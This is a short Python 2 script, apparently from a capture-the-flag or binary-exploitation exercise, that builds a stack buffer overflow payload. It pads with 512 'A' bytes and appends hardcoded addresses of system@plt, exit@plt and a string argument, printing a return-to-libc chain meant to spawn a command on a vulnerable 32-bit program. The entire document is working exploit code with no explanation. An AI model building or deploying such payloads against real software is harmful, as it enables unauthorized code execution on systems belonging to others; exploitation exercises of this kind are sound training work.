import struct

def conv(x):
    return struct.pack("<I", x)

systemplt = conv(0x080486a0)
exitplt = conv(0x080486c0)
gnu_bin_abi = conv(0x8048174)

rop = 'A' * 512
rop += systemplt
rop += exitplt
rop += gnu_bin_abi

print rop
